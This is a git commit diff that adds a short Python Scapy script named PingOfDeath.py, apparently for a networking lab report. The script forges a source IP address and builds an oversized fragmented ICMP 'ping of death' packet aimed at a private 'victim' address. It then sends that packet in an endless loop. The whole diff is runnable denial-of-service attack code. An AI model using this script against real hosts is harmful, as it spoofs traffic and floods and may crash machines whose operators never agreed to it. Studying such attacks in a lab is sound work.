34ecc661b9848243edf74f8ab921d2ae60e9000a
Pietro Prandini <prandinip@gmail.com>
2018-12-29 11:00:43 +0100

    Ping of death configuration files

--- report/scapy/PingOfDeath.py
+++ report/scapy/PingOfDeath.py
@@ -1,2 +1,13 @@
 #! /usr/bin/env python
 from scapy.all import *
+
+fake_ip = "192.168.1.177"
+victim = "192.168.62.10"
+max_length = 65535
+length_POD = max_length + 1
+
+# Preparing the packet
+ping_of_death = fragment(IP(src=fake_ip,dst=victim)/ICMP()/("X"*length_POD))
+
+# Sending packets (Stop it by pressing "CTRL+C")
+send(ping_of_death,loop=1)
